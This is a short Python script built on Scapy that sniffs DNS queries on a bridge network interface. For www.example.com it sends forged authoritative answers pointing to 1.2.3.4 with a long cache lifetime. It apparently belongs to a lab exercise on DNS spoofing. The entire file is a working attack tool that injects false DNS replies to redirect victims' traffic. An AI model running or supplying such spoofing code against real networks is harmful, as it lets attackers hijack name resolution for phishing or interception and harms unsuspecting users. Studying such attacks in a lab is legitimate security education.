from scapy.all import *

NS_NAME = "www.example.com"

def spoof_dns(pkt):
    # Debug every sniffed packet
    print("\n[DEBUG] Packet sniffed")

    if DNS in pkt and pkt.haslayer(DNSQR):
        queried = pkt[DNS].qd.qname.decode().rstrip('.')
        print(f"[DEBUG] DNS Query for: {queried}")

        if queried == NS_NAME:
            print(f"[!] Spoofing DNS for {queried}")
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            ans = DNSRR(rrname=pkt[DNS].qd.qname, ttl=259200, rdata="1.2.3.4")
            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=ans, qdcount=1, ancount=1)
            spoofpkt = ip / udp / dns
            send(spoofpkt, verbose=0)
            print("[+] Spoofed packet sent!")

iface = "br-233f3ca0592c"
print(f"[*] Listening for DNS queries on interface: {iface}")
sniff(filter="udp port 53", iface=iface, prn=spoof_dns)

